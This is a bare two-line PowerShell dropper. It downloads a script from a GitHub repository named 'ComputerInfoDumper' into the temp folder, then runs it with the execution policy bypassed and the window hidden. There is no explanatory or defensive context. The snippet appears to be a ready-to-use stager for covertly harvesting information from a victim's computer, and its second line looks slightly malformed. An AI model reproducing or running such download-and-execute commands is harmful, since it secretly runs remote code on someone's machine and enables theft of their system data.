iwr -useb "https://raw.githubusercontent.com/dazd-pkz/ComputerInfoDumper/main/ssg-008.ps1" -o $env:TEMP\script.ps1
saps "powershell -executionpolicy bypass env:TEMP\script.ps1" -WindowStyle Hidden
